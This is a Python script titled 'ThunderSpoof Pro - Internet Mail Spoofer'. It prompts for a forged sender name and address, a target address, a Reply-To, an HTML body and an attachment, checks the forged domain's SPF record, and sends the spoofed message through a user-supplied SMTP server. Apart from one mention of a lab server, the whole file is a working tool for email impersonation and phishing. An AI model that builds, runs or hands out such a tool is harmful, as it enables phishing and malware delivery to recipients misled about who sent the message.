import smtplib
import dns.resolver
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

def check_spf(domain):
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for rdata in answers:
            if 'v=spf1' in str(rdata):
                return f"[SPF ✅] {rdata}"
        return "[SPF ❌] No SPF record found."
    except:
        return "[SPF ❌] Could not check SPF."

def send_email(smtp_host, smtp_port, from_name, from_email, to_email, reply_to, subject, html_body, attachment_path=None):
    msg = MIMEMultipart()
    msg['From'] = f"{from_name} <{from_email}>"
    msg['To'] = to_email
    msg['Subject'] = subject
    if reply_to:
        msg['Reply-To'] = reply_to

    msg.attach(MIMEText(html_body, 'html'))

    if attachment_path and os.path.isfile(attachment_path):
        with open(attachment_path, 'rb') as f:
            part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
            part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
            msg.attach(part)

    try:
        with smtplib.SMTP(smtp_host, smtp_port) as server:
            server.send_message(msg)
            print("[✓] Email sent successfully.")
    except Exception as e:
        print(f"[✗] Failed to send email: {e}")

def main():
    print("🔥 ThunderSpoof Pro - Internet Mail Spoofer\n")

    smtp_host = input("SMTP Server (your lab VPS IP): ").strip()
    smtp_port = int(input("SMTP Port (25 recommended): "))
    from_name = input("Spoofed From Name: ")
    from_email = input("Spoofed From Email: ")
    to_email = input("Target Email: ")
    reply_to = input("Reply-To Address (optional): ")
    subject = input("Subject: ")
    html_body = input("HTML Body: ")
    attachment_path = input("Attachment file path (optional): ").strip()
    if not attachment_path:
        attachment_path = None

    domain = from_email.split('@')[-1]
    print("\n🔎 SPF Check for domain:", domain)
    print(check_spf(domain))

    confirm = input("\n✅ Send spoofed email? (y/n): ")
    if confirm.lower().startswith('y'):
        send_email(smtp_host, smtp_port, from_name, from_email, to_email, reply_to, subject, html_body, attachment_path)
    else:
        print("Aborted.")

if __name__ == "__main__":
    main()
